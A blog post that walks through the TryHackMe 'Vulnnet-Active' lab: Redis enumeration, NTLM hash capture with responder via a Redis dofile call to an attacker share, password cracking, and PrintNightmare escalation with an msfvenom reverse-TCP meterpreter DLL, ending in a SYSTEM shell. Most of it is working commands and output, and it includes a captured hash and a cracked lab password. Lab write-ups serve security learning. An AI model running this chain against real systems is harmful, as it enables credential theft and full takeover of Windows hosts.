---
layout: post
title:  "TryHackMe - Vulnnet-Active"
date:   2021-08-05 17:06:25
categories: Pentesting
---

# ENUMERATION

```
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-05T09:29:54
|_  start_date: N/A
```
Rustscan:

```
Open 10.10.161.203:53
Open 10.10.161.203:135
Open 10.10.161.203:139
Open 10.10.161.203:445
Open 10.10.161.203:464
Open 10.10.161.203:6379
Open 10.10.161.203:9389
```
we conect to port 6379 via redis-cli and use this command:

```
config get *
```
This gives us one username:

```
"C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```
# FOOTHOLD

We get user creds via a mind-blowing tool called responder .
On kali listener:
```s
┌──(kali㉿MaskdMafia)-[~/Downloads]
└─$ sudo responder -I tun0 -rdwv                                              
```
And in one more terminal run:
```s
┌──(kali㉿MaskdMafia)-[~/Downloads]
└─$ redis-cli -h 10.10.10.115 eval "dofile('//10.9.1.99/share')" 0            
```
In the listener terminal we get the user's hash:

```
[SMB] NTLMv2-SSP Client   : 10.10.10.115
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:35be0b3dd3bcbb35:DABF5D2F424DC01BC3B0688FA36EA48E:0101000000000000807CEB00188AD7019DBE059414C0E8260000000002000800430032003400410001001E00570049004E002D005800540059004600520044003800390047005500490004003400570049004E002D00580054005900460052004400380039004700550049002E0043003200340041002E004C004F00430041004C000300140043003200340041002E004C004F00430041004C000500140043003200340041002E004C004F00430041004C0007000800807CEB00188AD7010600040002000000080030003000000000000000000000000030000006411E2995AE716EF729BE1CB914F72CDCD4945507812139B7DD3778BCB072610A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0039002E0031002E00390039000000000000000000
```
Crack this using JohnTheRipper and we get the password:
```
sand_0873959498
```
Enumerate SMB shares:
```s
┌──(kali㉿MaskdMafia)-[~/Downloads]
└─$ smbclient -L \\\\active.thm\\ -U enterprise-security                          1 ⨯
Enter WORKGROUP\enterprise-security's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Enterprise-Share Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
We read user flag via redis-cli:

```s
redis-cli -h 10.10.50.31 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0
```

# PRIVILEGE ESCALATION

We did privilege escalation via the recent PrintNightmare vulnerability

[PrintNightmare](https://www.youtube.com/watch?v=awQjEm0etO0)

We followed the tutorial and finally got a root shell :

```s
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.1.99 LPORT=1337 -f dll > please.dll
```

Start up smbserver:

```s
(impacket) ┌──(kali㉿MaskdMafia)-[~/Downloads/nightmare/impacket]
└─$ smbserver.py share `pwd` -smb2support
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Run printnightmare with the previous creds:

```s
(impacket) ┌──(kali㉿MaskdMafia)-[~/Downloads/nightmare/impacket]
└─$ python3 printnightmare.py VULNNET/enterprise-security:'sand_0873959498'@10.10.201.126 '\\10.9.1.99\share\please.dll'
```
Listening on msfconsole:

```s
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.1.99:1337 
[*] Sending stage (200262 bytes) to 10.10.201.126
[*] Meterpreter session 3 opened (10.9.1.99:1337 -> 10.10.201.126:49884) at 2021-08-05 17:59:00 +0530
```
Finally we get root:

```s
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cd c:\Users\Administrator
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd users
meterpreter > cd administrator
meterpreter > pwd
C:\users\administrator
meterpreter > cd desktop
meterpreter > dir
Listing: C:\users\administrator\desktop
=======================================

Mode           Size  Type  Last modified          Name
----           ----  ----  -------------          ----
100666/rw-rw-  282   fil   2021-02-23 01:16:16 +  desktop.ini
rw-                        0530
100666/rw-rw-  37    fil   2021-02-24 09:56:32 +  system.txt
rw-                        0530

meterpreter > cat system.txt
```

